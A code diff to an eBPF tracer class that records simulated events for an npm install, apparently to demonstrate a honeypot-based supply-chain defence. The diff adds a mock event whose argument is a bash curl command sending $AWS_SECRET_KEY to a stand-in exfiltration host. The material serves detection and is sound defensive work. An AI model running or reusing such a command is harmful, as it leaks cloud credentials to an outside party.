@@ -77,25 +77,34 @@ class EBPFTracer:
             comm="npm",
             pid=2041,
             ppid=1000,
-            details={"command": "npm install", "args": ["install"]}
+            details={"filename": "/usr/bin/npm", "argv": ["install"]}
         )
 
-        # 2. openat (.env or config file access)
+        # 2. malicious execve (exfil command)
+        self.record_event(
+            event_type=EventType.EXECVE,
+            comm="bash",
+            pid=4102,
+            ppid=2041,
+            details={"filename": "/bin/bash", "argv": ["-c", "curl http://malicious-exfil.com?key=$AWS_SECRET_KEY"]}
+        )
+
+        # 3. openat (.env or config file access)
         self.record_event(
             event_type=EventType.OPENAT,
             comm="node",
             pid=2042,
             ppid=2041,
-            details={"target_file": ".env", "flags": "O_RDONLY"}
+            details={"filename": ".env.honeypot", "flags": "O_RDONLY"}
         )
 
-        # 3. connect (outbound socket connection)
+        # 4. connect (outbound socket connection)
         self.record_event(
             event_type=EventType.CONNECT,
-            comm="node",
-            pid=2042,
-            ppid=2041,
-            details={"target_ip": "192.0.2.1", "port": 443, "proto": "TCP"}
+            comm="curl",
+            pid=4103,
+            ppid=4102,
+            details={"ip": "104.21.44.11", "port": 80, "proto": "TCP"}
         )
 
         if honeypot_triggered:
@@ -104,6 +113,6 @@ class EBPFTracer:
                 comm="node",
                 pid=2042,
                 ppid=2041,
-                details={"triggered_decoy": decoy_name or "AWS_ACCESS_KEY_ID", "action": "HALTED_BY_MANTITUP"},
+                details={"honeypot_key": decoy_name or "AWS_ACCESS_KEY_ID", "action": "HALTED_BY_MANTITUP"},
                 is_anomaly=True
             )
